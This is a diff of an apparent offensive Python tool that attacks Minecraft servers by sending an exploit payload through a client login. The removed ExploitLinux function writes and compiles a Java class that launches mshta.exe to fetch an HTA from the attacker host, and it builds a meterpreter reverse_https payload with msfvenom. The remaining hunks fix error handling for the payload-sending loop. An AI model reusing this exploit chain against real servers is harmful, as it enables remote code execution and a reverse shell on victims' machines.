@@ -63,49 +63,6 @@ def kill_processes():
         print(f"[+] Process with PID {pid} killed.")
 
 
-def ExploitLinux(LHOST):
-    data = '''
-public class Exploit {
-    public Exploit() {}
-    static {
-        try {
-            String[] cmds = {
-                 "cmd.exe", "/c", "start","mshta.exe", "http://%s:8000/theload.hta"
-            };
-            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-    public static void main(String[] args) {
-        Exploit e = new Exploit();
-    }
-}
-''' % LHOST
-
-
-    with open("./Exploit.java", 'w') as file:
-        file.write(data)
-    
-    sleep(3)
-    command = ['./jdk1.8.0_181/bin/javac', './Exploit.java', ]
-    subprocess.call(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-    if os.path.isfile('./Exploit.class'):
-        print("[+] Exploit compiled...")
-    else:
-        print("[-] FAILED TO COMPILE EXPLOIT!")
-        exit(1)
-    command = ['msfvenom', '-p', 'windows/x64/meterpreter/reverse_https', 'LHOST=tun0', 'LPORT=4444', '-f', 'hta-psh']
-
-    with open('./theload.hta', 'wb') as f:
-        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        stdout, stderr = process.communicate()
-        f.write(stdout.encode())
-    if os.path.isfile('./theload.hta'):
-        print("[+] Malware generated...")
-    else:
-        print("[-] FAILED TO GENERATE MALWARE!")
-        exit(1)
 
 def ExploitWindows(LHOST):
     data = '''
@@ -165,6 +122,7 @@ def authAndSend(minecraftUser, minecraftPass, IP,LHOST):
     while True:
 
         output_line = process.stdout.readline()
+        #print(output_line) #debug line for connection
         # Print  animation
         for symbol in loading_symbols * 10:
             print(f"\r[{symbol}] Sending payload of {Fore.RED}{payload}{Style.RESET_ALL}", end='', flush=True)
@@ -177,12 +135,16 @@ def authAndSend(minecraftUser, minecraftPass, IP,LHOST):
             print(f"{Fore.GREEN}\n[+] Successfully joined the Minecraft server!!{Style.RESET_ALL}")
             break
         
-        if "[MCC] Connection has been lost." or "Failed to ping this IP" in output_line:
+        if "[MCC] Connection has been lost." in output_line:
             print(f"{Fore.RED}\n[-] Failed to join the Minecraft server!! Is it up?{Style.RESET_ALL}")
             kill_processes()
             exit(1)
         if "Microsoft authenticate failed:" in output_line:
             print(f"{Fore.RED}\n[-] Failed to authenticate... you got fat fingers?{Style.RESET_ALL}")
+            kill_processes()
+            exit(1)
+        if "Failed to ping this IP" in output_line:
+            print(f"{Fore.RED}\n[-] Failed to join the Minecraft server!! Is it up?{Style.RESET_ALL}")
             kill_processes()
             exit(1)
 
